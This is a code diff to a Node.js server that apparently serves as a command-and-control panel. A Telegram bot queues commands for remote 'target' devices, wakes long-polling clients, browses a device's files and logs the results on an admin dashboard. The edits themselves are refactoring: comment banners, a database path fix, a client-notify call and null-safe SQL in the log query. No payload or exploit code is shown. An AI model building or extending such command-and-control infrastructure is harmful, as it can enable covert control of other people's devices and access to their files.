@@ -16,7 +16,10 @@ const { v4: uuidv4 } = require('uuid');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
 
-// --- KONFIGURASI ---
+
+/** ===================================
+ * CONFIGURATION SETUP
+ * =================================== */
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '';
 const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
 const AUTH_TOKEN = process.env.AUTH_TOKEN || 'my-secret-token';
@@ -26,12 +29,15 @@ const ALLOWED_IDS = (process.env.ALLOWED_IDS || '').split(',').map(id => id.trim
 
 const app = express();
 
-// --- DATABASE SETUP ---
+
+/** ===================================
+ * DATABASE SETUP (SQLITE)
+ * =================================== */
 let db;
 (async () => {
     try {
         db = await open({
-            filename: './database.sqlite',
+            filename: path.join(__dirname, 'database.sqlite'),
             driver: sqlite3.Database
         });
 
@@ -217,7 +223,10 @@ const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) 
     }
 };
 
-// --- TELEGRAM BOT ---
+
+/** ===================================
+ * TELEGRAM COMMAND & CONTROL (BOT)
+ * =================================== */
 let bot;
 let lastSelectedDevice = null;
 if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
@@ -456,6 +465,9 @@ Format Eksekusi Manual:
         await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id) VALUES (?, ?, ?, ?, ?, ?, ?)',
             [cmdId, devId, realCmdName, cmdText, 'pending', chatId, messageId]);
 
+        // Beritahu client jika sedang menunggu long-polling
+        notifyClient(devId, { id: cmdId, command: realCmdName, text: cmdText });
+
         // Mencegah Spam, kita gunakan editMessageText
         try {
             await ctx.editMessageText(`⏳ <b>[${realCmdName}]</b> dieksekusi!\nTarget: <code>${devId}</code>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });
@@ -569,7 +581,10 @@ Format Eksekusi Manual:
     }
 }
 
-// --- EXPRESS ENDPOINTS ---
+
+/** ===================================
+ * WEB DASHBOARD EXTENSION (EXPRESS)
+ * =================================== */
 app.get('/', (req, res) => {
     res.json({ status: 'running', engine: 'Node.js Express', database: 'SQLite' });
 });
@@ -849,26 +864,26 @@ app.get('/admin/api/logs', async (req, res) => {
 
         const query = `
             SELECT 
-                id,
+                CAST(id AS TEXT) as id,
                 'log' as type,
-                device_id, 
-                command_id, 
+                COALESCE(device_id, '-') as device_id, 
+                COALESCE(command_id, '-') as command_id, 
                 level, 
                 created_at, 
-                SUBSTR(message, 1, 300) AS message_preview 
+                COALESCE(SUBSTR(message, 1, 300), '') AS message_preview 
             FROM system_logs 
             WHERE command_id IS NULL
             
             UNION ALL 
             
             SELECT 
-                COALESCE(l.id, c.id) as id,
+                CAST(COALESCE(l.id, c.id) AS TEXT) as id,
                 CASE WHEN l.id IS NOT NULL THEN 'log' ELSE 'cmd' END as type,
-                c.device_id, 
-                c.id AS command_id, 
+                COALESCE(c.device_id, '-') as device_id, 
+                COALESCE(c.id, '-') AS command_id, 
                 CASE WHEN l.id IS NOT NULL THEN l.level ELSE c.status END AS level, 
                 COALESCE(l.created_at, c.created_at) as created_at, 
-                SUBSTR('Cmd: ' || c.command || ' ' || c.text || COALESCE(' ➔ ' || l.message, ''), 1, 300) AS message_preview 
+                COALESCE(SUBSTR('Cmd: ' || c.command || ' ' || COALESCE(c.text, '') || COALESCE(' ➔ ' || l.message, ''), 1, 300), '') AS message_preview 
             FROM commands c
             LEFT JOIN system_logs l ON c.id = l.command_id
             
